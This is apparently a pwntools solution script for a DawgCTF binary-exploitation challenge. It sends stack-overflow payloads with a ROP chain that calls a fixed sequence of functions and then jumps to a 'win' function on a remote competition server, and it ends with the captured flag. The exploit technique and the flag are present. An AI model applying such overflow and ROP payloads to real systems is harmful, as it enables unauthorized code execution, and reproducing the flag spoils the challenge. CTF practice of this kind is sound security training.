from pwn import *

context.binary = elf = ELF('./rop')
p = remote("ctf.umbccd.io", 4100)
# p = process('./rop')
# gdb.attach(p, '''
#     init-gef
#     b *0x08049713
# ''')
# rop = ROP(elf)

seq = [
    'tilted_towers',
    'junk_junction',
    'snobby_shores',
    'greasy_grove',
    'lonely_lodge',
    'dusty_depot',
]
p.recvuntil("roppin boys?\n")
for item in seq:
    ropchain = "A" * 16 + flat([
        elf.symbols[item],
        elf.symbols['tryme']
    ])
    p.send(ropchain)

p.sendline("A" * 16 + p32(elf.symbols['win']))

p.interactive()
# DawgCTF{f0rtni9ht_xD}
